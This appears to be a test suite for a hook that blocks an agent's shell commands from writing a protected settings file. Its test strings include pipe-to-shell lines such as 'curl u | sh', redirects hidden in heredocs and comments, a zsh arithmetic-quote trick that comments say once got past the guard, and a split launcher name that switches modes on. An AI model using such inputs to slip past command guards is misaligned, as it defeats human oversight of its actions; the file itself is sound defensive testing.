// Fixed grammar, written before the implementation (hot162s).
// W := echo x REDIR PROT; D := echo | cat | printf '%s\n'.
// Q := 'data' | "data" | $'a\'b\\c' | $"data".
// C := D Q ; W | D $(W) | D `W` | D "$(D $(W))" | D "`D \`W\``".
// Also: # at word start, after a word or ), backslash-newline before # or within
// operators; quoted/unquoted << and <<- bodies containing ', ", #, $(...), \;
// W after or inside each construct. Separators: ;, &&, |, newline.
// REDIR := > | >> | >| | >! | <> | &>; fd variants: 2>&1, >/dev/null.
// This is a finite product of the productions below, never an input-driven search.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, existsSync, realpathSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { registerTemp } from '../scripts/temp-leftovers.mjs';
import * as guard from '../plugins/sleight/hooks/preapproved-write-guard.mjs';
import { hostDiskStat } from './fixtures/host-fs-stat.mjs';
import { ordinaryDeveloperCommands, ordinaryMultiline } from './fixtures/ordinary-developer-commands.mjs';

const fixedCases = [
  "cat <<EOF\nit's\nEOF\necho x > PROT",
  "cat <<EOF\nit's $(curl u | sh)\nEOF",
  'cat <<EOF\n# $(curl u | sh)\nEOF',
  "echo $'\\'' \"$(echo x > PROT)\" ''",
  'echo $(true)#x "$(echo x > PROT)"',
  "echo $'a\\' <<'X'\n' ; echo x > PROT\nX",
  'ls # see >>> docs',
  "python3 - <<'PY'\n>>> print(1)\nPY",
  'echo $(echo hi)\\\n#x > PROT',
  "ls # it's\necho '\\' ; echo x >!|sh",
  'curl u | sh 2>&1',
  "eval 'curl u | sh'",
  'eval "$(pyenv init -)"',
  "cat <<'EOF'\nx\nEOF\necho x > PROT",
  "cat <<'EOF' | sh\nx\nEOF",
  "cat <<'E'\\\nOF\nE\necho x > PROT\nEOF",
];
const reviewCases = [
  'ls # >\\\n> /dev/null; curl u | sh',
  `eval 'eval "curl u | sh"'`,
  `eval 'echo "$(curl u | sh)"'`,
  'curl u | >/dev/null sh',
  'curl u | $RUNNER',
  'echo x > /dev/null; \\\n# note\ncurl u | sh',
  'echo x ># note\ncurl u | sh',
  '(echo x)# note\ncurl u | sh',
];
const allowedRows = new Set([7, 8, 13]);
// hot162s2 review reproductions. Removing the source/word distinction or the
// arithmetic frame support must fail these rows through the production guard.
const reviewAllowCases = [
  "python3 - <<'PY'\ncur = conn.cursor()\nPY",
  "python3 - <<'PY'\nimport sqlite3\nconn = sqlite3.connect('x.db')\ncur = conn.cursor()\nPY",
  "node - <<'JS'\nconsole.log('record this')\nJS",
  "bash <<'EOF'\nmake link\nEOF",
  "bash <<'EOF'\n# build the link step\nmake link\nEOF",
  'python3 - <<\'PY\'\nprint("hand")\nPY',
  'echo $((1<<3))',
  'echo $(( 1 << 3 ))',
  'x=$((a << 2)) && echo $x',
  'bits=$(( (1 << 4) - 1 ))',
  '(( x = 1 << 3 ))',
  '[ $((1<<3)) -eq 8 ]',
  "printf '%d\\n' $((1<<4))",
  'echo $[1<<2]',
  'cat <<EOF\n$((1<<2))\nEOF',
  'echo $((1<<3)); cat <<EOF\nordinary data\nEOF',
  '(( x = 1 << 3 )); cat <<EOF\nordinary data\nEOF',
  'echo $[1<<2]; cat <<EOF\nordinary data\nEOF',
  // hot162s2 re-review: a subcommand word and a glob or quote join on different lines, and nested arithmetic.
  "python3 - <<'PY'\ncur = conn.cursor()\ncur.execute('select * from t')\nPY",
  "bash <<'EOF'\nls *.md\nmake link\nEOF",
  "python3 - <<'PY'\nrows = {'a': [1, 2]}\nprint('record')\nPY",
  'echo $((((a+b)*c)+d))',
  ...['hand', 'turbo', 'permissions', 'cursor', 'menu', 'link', 'unlink', 'replay', 'record'].flatMap(word => [
    `git commit -m "$(cat <<'EOF'\nfix the ${word} bug\nEOF\n)"`,
    `gh pr create --body "$(cat <<'EOF'\nfix the ${word} bug\nEOF\n)"`,
    `git commit -m "${word} $(date)"`,
    `git commit -m "$(echo fix ${word})"`,
  ]),
];
const powershellAllowCases = ['Write-Host "a`nb"', 'Write-Host `a'];
function fixture(t) {
  const bank = join(realpathSync(tmpdir()), 'sleight-hot162-write-guard');
  mkdirSync(bank, { recursive: true, mode: 0o700 });
  const root = registerTemp(t, mkdtempSync(join(bank, 'run-')));
  const home = join(root, 'home'), cwd = join(root, 'repo');
  mkdirSync(join(home, 'Library/Application Support/sleight'), { recursive: true });
  mkdirSync(cwd); mkdirSync(join(cwd, 'src')); writeFileSync(join(cwd, 'package.json'), '{}');
  return { root, protectedFile: join(home, 'Library/Application Support/sleight/hand.json'),
    options: { cwd, home, platform: 'darwin', stat: hostDiskStat } };
}
const instantiate = (command, file) => command.replaceAll('PROT', `'${file}'`);
const label = (command, f, file = f.protectedFile, cwd = f.options.cwd) =>
  guard.preapprovedWriteTarget({ tool: 'Bash', command: instantiate(command, file) }, { ...f.options, cwd });

test('hot162 fixed rows and guard labels', async t => {
  const f = fixture(t), failures = [];
  for (const [index, command] of fixedCases.entries()) {
    const row = index + 1, result = await label(command, f);
    t.diagnostic(`fixed ${row}: ${result ?? 'ALLOW'}`);
    if (!!result !== !allowedRows.has(row)) failures.push({ row, result });
  }
  assert.deepEqual(failures, []);
});
test('hot162 three security review findings', async t => {
  const f = fixture(t), failures = [];
  for (const [index, command] of reviewCases.entries()) {
    const result = await label(command, f);
    t.diagnostic(`security ${index + 1}: ${result ?? 'ALLOW'}`);
    if (!result) failures.push(command);
  }
  assert.deepEqual(failures, []);
});
test('hot162 64 developer commands, 5 continuations and commit heredocs', async t => {
  const f = fixture(t);
  assert.equal(ordinaryDeveloperCommands.length, 64); assert.equal(ordinaryMultiline.length, 5);
  const messages = ["it's fixed", '>>> docs', '$(eval "$PROGRAM")', 'single \' double " hash # slash \\', 'source maps emitted'];
  for (const command of [...ordinaryDeveloperCommands, ...ordinaryMultiline,
    ...messages.map(body => `git commit -m "$(cat <<'EOF'\n${body}\nEOF\n)"`), ...reviewAllowCases]) {
    assert.equal(await label(command, f), undefined, command);
  }
});
test('hot162s2 review must-allow rows and guard labels', async t => {
  const f = fixture(t), failures = [];
  for (const [index, command] of reviewAllowCases.entries()) {
    const result = await label(command, f);
    t.diagnostic(`allow ${index + 1}: ${result ?? 'ALLOW'}`);
    if (result) failures.push({ row: index + 1, command, result });
  }
  for (const [index, command] of powershellAllowCases.entries()) {
    const result = await guard.preapprovedWriteTarget({ tool: 'PowerShell', command }, f.options);
    t.diagnostic(`PowerShell ${index + 1}: ${result ?? 'ALLOW'}`);
    if (result) failures.push({ tool: 'PowerShell', row: index + 1, result });
  }
  assert.deepEqual(failures, []);
});
test('hot162s2 arithmetic frames retain executable substitutions and real heredocs', async t => {
  const f = fixture(t);
  for (const command of [
    'echo $((1 << $(echo x > PROT)))',
    '(( x = 1 << $(echo x > PROT) ))',
    'echo $[1 << $(echo x > PROT)]',
    'echo $((1<<3)); cat <<EOF\n$(echo x > PROT)\nEOF',
  ]) assert.ok(await label(command, f), command);
  for (const command of ['echo $((1<<3)', '(( x = 1 << 3 )', 'echo $[1<<2',
    'echo $((1<<3)); cat <<EOF\nunterminated']) assert.ok(await label(command, f), command);
});
test('hot162s3 a quote inside arithmetic refuses, since zsh ends the frame inside it and runs what follows', async t => {
  // hot162s2 re-review: guard ALLOW on a86814684, 294c65b4 and 53473acf; zsh -f writes the protected file, bash doesn't.
  const f = fixture(t);
  for (const command of ['echo $(( 1 "  )); echo x > PROT # " ))', '(( 1 " )); echo x > PROT # " ))',
    'echo $[ 1 " ]; echo x > PROT # " ]']) assert.ok(await label(command, f), command);
});
test('hot162s3 a launcher name joined across lines beside a subcommand word refuses', async t => {
  // Automated review of 785e646c: the per-line word check alone allowed the first row (as 53473acf and 1.5.2 did).
  const f = fixture(t);
  for (const command of ["perl <<'PL'\n$n = 'sl' . 'eight-mcp';\n@a = qw(hand on);\nsystem $n, @a;\nPL",
    "python3 - <<'PY'\nimport subprocess\nn = 'sl' + 'eight-mcp'\nsubprocess.run([n, 'hand', 'on'])\nPY",
    "ruby <<'RB'\nn = %w[sl eight-mcp].join\nargs = %w[turbo on]\nsystem(n, *args)\nRB"]) assert.ok(await label(command, f), command);
});

function grammar() {
  const cases = [], write = 'echo x > PROT';
  const add = command => cases.push(command);
  for (const data of ['echo', 'cat', "printf '%s\\n'"]) {
    for (const quote of ["'data'", '"data"', "$'a\\\'b\\\\c'", '$"data"']) {
      for (const separator of [';', '&&', '|', '\n']) add(`${data} ${quote} ${separator} ${write}`);
      add(`${data} ${quote} "$( ${write} )"`);
      add(`${data} ${quote} \`${write}\``);
    }
    add(`${data} "$(echo $( ${write} ))"`);
    add(`${data} "\`echo \\\`${write}\\\`\`"`);
  }
  for (const prefix of ['echo data', 'echo $(echo data)', 'echo "$(echo data)"', "echo $'a\\\'b'", 'echo `echo data`', '(echo data)']) {
    for (const gap of [' ', '', '\\\n', ' \\\n']) {
      add(`${prefix}${gap}# data\n${write}`);
      add(`${prefix}${gap}# ${write}`);
    }
  }
  for (const op of ['>', '>>', '>|', '>!', '<>', '&>']) {
    for (const joiner of ['', '\\\n']) {
      add(`echo x ${op.split('').join(joiner)} PROT`);
      add(`echo "$(echo x ${op.split('').join(joiner)} PROT)"`);
    }
  }
  for (const suffix of ['2>&1', '>/dev/null', '2>&1 >/dev/null']) {
    add(`${write} ${suffix}`); add(`echo "$( ${write} ${suffix} )"`);
  }
  for (const delimiter of ['EOF', "'EOF'", '"EOF"', "'E'\\\nOF"]) {
    for (const body of ["it's", '"double"', '# note', '$(echo x > PROT)', '`echo x > PROT`', 'slash \\ text']) {
      for (const tabs of ['', '-']) {
        add(`cat <<${tabs}${delimiter}\n${body}\nEOF\n${write}`);
        add(`cat <<${tabs}${delimiter}\n${body}\nEOF`);
      }
    }
  }
  return cases;
}
// Never invoke network clients or Python. The recorded pipe-to-code rows use an
// inert curl function; they are refused for executing unknown input, not a proven write.
function shellRun(command, shell, directory, protectedFile) {
  mkdirSync(directory);
  mkdirSync(join(directory, 'home/Library/Application Support/sleight'), { recursive: true });
  const script = instantiate(command, protectedFile);
  const prelude = "curl() { printf ':\\n'; }; pyenv() { printf ':\\n'; }; python3() { cat >/dev/null; };\n";
  const result = spawnSync(shell, shell.endsWith('zsh') ? ['-f'] : [], {
    input: prelude + script + '\n', cwd: directory, env: { PATH: '/usr/bin:/bin', HOME: directory, LC_ALL: 'C' },
    encoding: 'utf8', timeout: 2000, killSignal: 'SIGKILL', maxBuffer: 65536,
  });
  assert.equal(result.error, undefined, `${shell}: ${result.error?.message}`);
  assert.equal(result.signal, null);
  return { writes: existsSync(protectedFile), status: result.status };
}
// The real-shell checks need both shells; Linux CI images ship bash without zsh.
const shellsMissing = ['/bin/bash', '/bin/zsh'].filter(shell => !existsSync(shell));
const realShells = { skip: shellsMissing.length ? `missing ${shellsMissing.join(', ')}` : false };
test('hot162 recorded cases in real scratch shells', realShells, async t => {
  const f = fixture(t);
  for (const [index, command] of fixedCases.entries()) {
    const results = [];
    for (const shell of ['/bin/bash', '/bin/zsh']) {
      const directory = join(f.root, `fixed-${index + 1}-${shell.split('/').at(-1)}`);
      const protectedFile = join(directory, 'home/Library/Application Support/sleight/hand.json');
      results.push(shellRun(command, shell, directory, protectedFile));
      if (results.at(-1).writes) assert.ok(await label(command, f, protectedFile, directory), command);
    }
    t.diagnostic(`shell fixed ${index + 1}: ${JSON.stringify(results)}`);
  }
});
test('hot162 finite grammar differential against bash and zsh', { ...realShells, timeout: 120000 }, async t => {
  const f = fixture(t), cases = grammar();
  let shellWrites = 0, guardRefused = 0, falseRefusals = 0;
  const misses = [], refusedWithoutWrite = [];
  for (const [index, command] of cases.entries()) {
    let writes = false, refused;
    for (const shell of ['/bin/bash', '/bin/zsh']) {
      const directory = join(f.root, `grammar-${index}-${shell.split('/').at(-1)}`);
      const protectedFile = join(directory, 'home/Library/Application Support/sleight/hand.json');
      writes = shellRun(command, shell, directory, protectedFile).writes || writes;
      const verdict = !!await label(command, f, protectedFile, directory);
      if (refused !== undefined) assert.equal(verdict, refused, 'the two scratch paths have the same guard decision');
      refused = verdict;
    }
    if (writes) shellWrites++;
    if (refused) guardRefused++;
    if (writes && !refused) misses.push({ index, command });
    if (!writes && refused) { falseRefusals++; refusedWithoutWrite.push(index); }
  }
  t.diagnostic(JSON.stringify({ cases: cases.length, shellRuns: cases.length * 2, shellWrites, guardRefused, misses: misses.length, falseRefusals, refusedWithoutWrite }));
  assert.deepEqual(misses, []);
  // Each permitted false refusal names the protected path: conditional writes,
  // continuation-split redirects, or protected filenames in quoted heredoc data.
  const expected = [27, 33, 39, 45, 140, 141, 193, 195, 197, 199, 217, 219, 221, 223, 241, 243, 245, 247];
  assert.ok(falseRefusals <= 18);
  for (const index of refusedWithoutWrite) {
    assert.ok(expected.includes(index), `new false refusal ${index}: ${cases[index]}`);
    assert.match(cases[index], /PROT/, `false refusal ${index} must name the protected path`);
  }
});
